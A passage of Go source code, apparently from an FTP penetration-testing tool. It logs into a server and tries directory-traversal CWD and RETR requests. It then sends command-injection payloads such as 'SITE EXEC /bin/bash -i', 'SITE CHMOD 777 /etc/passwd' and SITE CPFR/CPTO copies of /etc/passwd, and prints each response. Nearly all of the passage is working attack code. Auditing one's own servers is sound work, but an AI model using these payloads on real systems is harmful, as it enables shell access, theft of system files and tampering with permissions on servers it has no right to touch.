	conn.Read(buffer) // Banner
	
	// Login
	conn.Write([]byte(fmt.Sprintf("USER %s\r\n", username)))
	time.Sleep(400 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buffer)
	
	conn.Write([]byte(fmt.Sprintf("PASS %s\r\n", password)))
	time.Sleep(400 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buffer)
	
	// Try directory traversal
	for _, path := range traversalPaths {
		conn.Write([]byte(fmt.Sprintf("CWD %s\r\n", path)))
		time.Sleep(500 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ := conn.Read(buffer)
		response := string(buffer[:n])
		
		printTest(fmt.Sprintf("Traversal: %s", path), true, strings.TrimSpace(response))
		
		// Try to retrieve file
		conn.Write([]byte(fmt.Sprintf("RETR %s\r\n", path)))
		time.Sleep(500 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ = conn.Read(buffer)
		response = string(buffer[:n])
		
		printTest(fmt.Sprintf("Retrieve: %s", path), true, strings.TrimSpace(response))
	}
	
	conn.Write([]byte("QUIT\r\n"))
	time.Sleep(100 * time.Millisecond)
}

func testFTPCommandInjection(host, port, username, password string) {
	printSection("FTP COMMAND INJECTION ATTEMPTS")
	
	injectionPayloads := []string{
		"SITE EXEC /bin/bash -i",
		"SITE CHMOD 777 /etc/passwd",
		"QUOTE SITE EXEC whoami",
		"SITE CPFR /etc/passwd",
		"SITE CPTO /tmp/passwd",
	}
	
	addr := fmt.Sprintf("%s:%s", host, port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	
	if err != nil {
		printTest("Command injection", false, err.Error())
		return
	}
	defer conn.Close()
	
	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buffer) // Banner
	
	// Login
	conn.Write([]byte(fmt.Sprintf("USER %s\r\n", username)))
	time.Sleep(400 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buffer)
	
	conn.Write([]byte(fmt.Sprintf("PASS %s\r\n", password)))
	time.Sleep(400 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buffer)
	
	// Try command injection
	for _, payload := range injectionPayloads {
		conn.Write([]byte(payload + "\r\n"))
		time.Sleep(500 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ := conn.Read(buffer)
		response := string(buffer[:n])
		
		printTest(fmt.Sprintf("Injection: %s", truncate(payload, 40)), true, strings.TrimSpace(response))
	}
	
	conn.Write([]byte("QUIT\r\n"))
	time.Sleep(100 * time.Millisecond)
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max]
}
